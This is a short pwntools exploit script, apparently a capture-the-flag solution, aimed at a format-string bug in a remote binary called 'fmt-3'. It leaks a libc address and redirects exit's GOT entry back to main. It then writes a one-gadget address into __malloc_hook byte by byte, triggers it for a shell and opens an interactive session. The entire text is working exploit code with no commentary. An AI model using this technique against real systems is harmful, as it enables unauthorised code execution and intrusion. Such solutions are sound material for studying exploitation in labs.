from pwn import *
import time

ip = "140.110.112.77"
port = 4004

r = remote(ip, port)
# r = process("./fmt-3")

Libc = ELF("./libc-2.27.so")

context.arch = "amd64"
# context.log_level = "debug"

main = 0x4011b3
exit_got = 0x404030

payload = b"%11$p.%4516c%9$hn".ljust(0x18, b'a')
payload += flat(exit_got)

r.sendline(payload)

libc = int(r.recvuntil(".")[:-1], 16) - 0x3f3660
log.info(hex(libc))
Libc.address = libc

malloc_hook = Libc.sym["__malloc_hook"]
win = libc + 0x4f322

for i in range(8):
    val = win & 0xff
    win >>= 8
    val %= 256
    if val == 0:
        val = 256
    payload = b"%{}c%9$hhn".format(val).ljust(0x18, b'a')
    payload += flat(malloc_hook + i)
    r.sendline(payload)
    time.sleep(0.1)

r.sendline("%65536c")

r.interactive()
